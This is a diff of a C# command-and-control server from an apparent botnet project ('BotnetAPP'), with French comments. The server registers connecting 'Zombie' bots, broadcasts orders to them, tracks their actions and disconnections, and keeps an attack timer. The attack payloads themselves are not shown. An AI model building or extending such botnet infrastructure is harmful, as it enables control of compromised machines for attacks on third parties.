@@ -26,6 +26,9 @@ namespace BotnetAPP.Network {
         public Boolean AttackInProgress ; 
         private Dictionary<Zombie, Socket> _connectedBot ;
 
+
+        private ConnectedBotList _bot; 
+
         // Timer 
         public System.Timers.Timer TimerAttack ; 
 
@@ -48,11 +51,7 @@ namespace BotnetAPP.Network {
         private ASCIIEncoding _asen = new ASCIIEncoding();
 
 
-        public Dictionary<Zombie, Socket> GetConnectedBot {
-            get {
-                return _connectedBot ; 
-            }
-        }
+        public Dictionary<Zombie, Socket> GetConnectedBot => _bot.Connected ;
 
     // méthode permettant de déclencher les événements 
     public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
@@ -67,8 +66,9 @@ namespace BotnetAPP.Network {
     public Connection() {
 
         // Initialisation de la liste contenant les utilisateurs connectés 
-        _connectedBot = new() ;
-        TimerAttack = new() ; 
+        TimerAttack = new() ;
+
+        _bot = new ConnectedBotList() ; 
 
 
         AttackInProgress = false ;
@@ -86,7 +86,9 @@ namespace BotnetAPP.Network {
 
         _checkingConnectionRequest.Start() ;
         _checkingBotDisconnection.Start() ;
-        _checkingChangeBotAction.Start() ; 
+       _checkingChangeBotAction.Start() ;
+
+       
 
     }
 
@@ -96,6 +98,8 @@ namespace BotnetAPP.Network {
     Lance le timer 
 
     */
+
+
 
     private void SetTimer(int second) {
         TimerAttack = new System.Timers.Timer() ;
@@ -130,10 +134,14 @@ namespace BotnetAPP.Network {
     private string GetIncomingMessage(Socket s) {
               byte[] rawMessage = new byte[1024];
               string resultat  = "";
+                          Console.WriteLine("1") ;
+
               int k = s.Receive(rawMessage);
+              Console.WriteLine("2") ;
                for (int i = 0; i < k; i++) {
                 resultat += Convert.ToChar(rawMessage[i]);
                }
+
                 return resultat ; 
         }
     
@@ -143,8 +151,11 @@ namespace BotnetAPP.Network {
 
     // Envoie un message a tout les bots connectés 
     private void BroadcastNetMessage (string message) {
-        foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
-            WriteNetMessage( message,item.Value) ; 
+
+        var bot = _bot.Connected ; 
+
+        foreach (KeyValuePair<Zombie, Socket> item in bot) {
+            WriteNetMessage( message, item.Value) ; 
         }
     }
         
@@ -168,38 +179,41 @@ namespace BotnetAPP.Network {
     public void UpdateBotAction() {
         while ( true ) {
 
+
+
             try {
 
 
                     Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new() ;
 
 
-                    lock (_connectedBot) {
-                    foreach ( KeyValuePair<Zombie, Socket> item in _connectedBot ) {
+
+
+                    var bot = _bot.Connected ; 
+
+                    foreach ( KeyValuePair<Zombie, Socket> item in bot ) {
                         string message = GetIncomingMessage(item.Value) ;
+
+                        
                         if ( message != "" ) {
-                            MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ; 
-                        }
+                            MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ;
+                        }    
                     }
-                        foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
-                            // On supprime pour le mettre a jour
-                            _connectedBot.Remove(item.Key.Key) ;
-
-                            item.Key.Key.SetAction(item.Value) ; 
-
-                            _connectedBot[item.Key.Key] = item.Key.Value ;
+                    
+                    foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
+                            _bot.ChangeAction(item.Key.Key,item.Value,item.Key.Value ) ; 
 
                         }
-                    }
+                    
+                    
+                    OnUpdateAction(new Zombie()) ;
 
                     
-
-
-                    OnUpdateAction(new Zombie()) ; 
             }
             catch (Exception ex) {
              Console.WriteLine(ex.StackTrace) ; 
             }
+
 
              // Une seconde avant chaque vérification 
          Thread.Sleep(1000);  
@@ -208,29 +222,28 @@ namespace BotnetAPP.Network {
 
 
 
+
+
+
     public void CheckBotsDisconnections() {
 
         while (true) {
 
-            List<Zombie> ZombieLost = new() ; 
 
-            lock (_connectedBot) {
-            foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
+            var bot = _bot.Connected ; 
+   
+            foreach (KeyValuePair<Zombie, Socket> item in bot) {
+
                 if ( !SocketConnected(item.Value) ) {
-                    Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté") ; 
-                    ZombieLost.Add(item.Key) ;                
+                    _bot.Remove(item.Key) ; 
+                    OnDisconnectionBot(item.Key) ;
+                    Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté") ;
+                     
+                    }    
                 }
-            }
-
             
-                foreach ( Zombie zb in ZombieLost) 
-                {
-                _connectedBot.Remove(zb) ;
-                OnDisconnectionBot(zb) ;
-                }                  
-            }
+            // Une seconde avant chaque vérification
             
-            // Une seconde avant chaque vérification 
          Thread.Sleep(1000);   
         }
     }
@@ -244,15 +257,17 @@ namespace BotnetAPP.Network {
 
                 TcpListener listen = new TcpListener(ipAd, _listenPort);
 
+                listen.Start();
                 while(true) {
                     
-                listen.Start();
+                
 
                 Console.WriteLine("Le serveur à démarrer sur le port " + _listenPort.ToString());
                 Console.WriteLine("L'adresse ip du serveur  :" + listen.LocalEndpoint);
                 Console.WriteLine("On attend la connexion.....");
 
                 Socket s = listen.AcceptSocket();
+              //  s.ReceiveTimeout = 1000 ; 
 
                 try {
                     Console.WriteLine("Connexion ouverte " + s.RemoteEndPoint);
@@ -262,15 +277,25 @@ namespace BotnetAPP.Network {
                     /* 
                     Pour l'instant je laisse comme ça
                     Plus tard je mettrais un vrai système de contrôle de connexion
-                    */ 
-                    if ( GetIncomingMessage(s) == "1" ) {
+                    */
+
+
+                    
+
+                        if ( GetIncomingMessage(s) == "1" ) {
+                             
                         Zombie nvZb = new(s.RemoteEndPoint.ToString()) ; 
-                        _connectedBot.Add(nvZb, s) ;
-                        OnNewConnectedBot(nvZb) ; 
+                        _bot.Add(nvZb, s) ; 
+                        OnNewConnectedBot(nvZb) ;
+
+           
+                       
+
                     }
+                    
 
 
-                    Console.WriteLine($"Nombre de bot connecté : {_connectedBot.Count}") ; 
+                    Console.WriteLine($"Nombre de bot connecté : {_bot.Count}") ; 
 
 
 
@@ -280,6 +305,10 @@ namespace BotnetAPP.Network {
 
                     Console.WriteLine("[EXCEPTION] : " + ex.StackTrace) ; 
                 }
+
+                Thread.Sleep(1000) ; 
+
+
         }
     }
   }
